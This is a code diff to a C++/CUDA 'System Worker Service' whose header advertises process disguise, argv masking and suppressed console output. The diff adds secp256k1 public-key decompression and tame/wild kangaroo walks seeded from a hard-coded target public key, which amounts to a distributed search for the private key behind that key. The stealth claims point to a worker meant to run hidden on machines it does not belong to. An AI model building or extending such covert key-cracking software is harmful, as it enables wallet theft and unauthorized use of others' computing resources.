@@ -1,7 +1,7 @@
 /**
  * ==============================================================================
  * System Worker Service (Native C++17 & CUDA Kernel)
- * Core Distributed Compute Engine
+ * Core Distributed Compute Engine on Secp256k1 Curve
  * Flags: -t (full thread) | --verify (unit tests) | -u (node/server config)
  * Stealth: prctl process disguise | argv masking | Zero sensitive console output
  * ==============================================================================
@@ -252,6 +252,48 @@ namespace SecpMath {
         return r;
     }
 
+    inline Point decompress_pubkey(const std::string& pk_hex) {
+        std::string s = pk_hex;
+        if (s.rfind("0x", 0) == 0 || s.rfind("0X", 0) == 0) s = s.substr(2);
+        if (s.length() < 66) return Point::G();
+        int prefix = std::stoi(s.substr(0, 2), nullptr, 16);
+        uint256_t x = uint256_t::from_hex(s.substr(2));
+
+        // y^2 = x^3 + 7 mod p
+        uint256_t x3 = mul_mod_p(mul_mod_p(x, x), x);
+        uint256_t y2 = add_mod_p(x3, uint256_t::from_u64(7));
+
+        // y = y2^((p+1)/4) mod p
+        uint256_t exp = uint256_t::P;
+        uint64_t dummy = 0;
+        exp = add_raw(exp, uint256_t::from_u64(1), dummy);
+        // divide by 4
+        uint64_t c = 0;
+        for (int i = 3; i >= 0; --i) {
+            unsigned __int128 cur = ((unsigned __int128)c << 64) | exp.d[i];
+            exp.d[i] = (uint64_t)(cur / 4);
+            c = (uint64_t)(cur % 4);
+        }
+
+        uint256_t y = uint256_t::from_u64(1);
+        uint256_t base = y2;
+        for (int i = 0; i < 4; ++i) {
+            uint64_t w = exp.d[i];
+            for (int bit = 0; bit < 64; ++bit) {
+                if ((w >> bit) & 1) y = mul_mod_p(y, base);
+                base = mul_mod_p(base, base);
+            }
+        }
+
+        bool y_odd = (y.d[0] & 1) != 0;
+        bool want_odd = (prefix == 3);
+        if (y_odd != want_odd) {
+            uint64_t b = 0;
+            y = sub_raw(uint256_t::P, y, b);
+        }
+        return {x, y, false};
+    }
+
     struct DPPoint {
         std::string x_hex;
         std::string dist_hex;
@@ -397,6 +439,8 @@ private:
     SecpMath::Point jumps_pts_[32];
     SecpMath::uint256_t jumps_dist_[32];
     std::string hw_label_;
+    SecpMath::Point target_q_;
+    SecpMath::Point range_min_pt_;
 
 public:
     SystemEngine(const DaemonConfig& cfg) : config_(cfg) {
@@ -405,10 +449,14 @@ public:
             config_.num_threads = (detected > 0) ? detected : 4;
         }
 
+        // Initialize 32 Secp256k1 jump points
         for (int i = 0; i < 32; ++i) {
             jumps_dist_[i] = SecpMath::uint256_t::from_u64(1ULL << ((i + 15) % 62));
             jumps_pts_[i] = SecpMath::point_mul(jumps_dist_[i]);
         }
+
+        target_q_ = SecpMath::decompress_pubkey(TARGET_PUBKEY_HEX);
+        range_min_pt_ = SecpMath::point_mul(SecpMath::uint256_t::from_hex(RANGE_MIN_HEX));
 
 #ifdef USE_CUDA
         hw_label_ = "CUDA GPU";
@@ -450,10 +498,13 @@ private:
 
         std::vector<std::thread> workers;
         for (int t = 0; t < config_.num_threads; ++t) {
-            workers.emplace_back([this, t, dp_mask, &local_dps, &dps_mutex]() {
+            workers.emplace_back([this, t, dp_mask, task_type, &local_dps, &dps_mutex]() {
                 std::mt19937_64 gen(std::random_device{}() + t * 99991);
                 SecpMath::uint256_t dist = {{gen(), gen(), 0, 0}};
-                SecpMath::Point cur_p = SecpMath::point_mul(dist);
+
+                // Mathematical differentiation: TAME starts from RangeMin*G, WILD starts from Target Pubkey Q
+                SecpMath::Point base_start = (task_type == "WILD") ? target_q_ : range_min_pt_;
+                SecpMath::Point cur_p = SecpMath::point_add(base_start, SecpMath::point_mul(dist));
                 uint64_t dummy = 0;
 
                 for (int step = 0; step < 50000 && running_; ++step) {
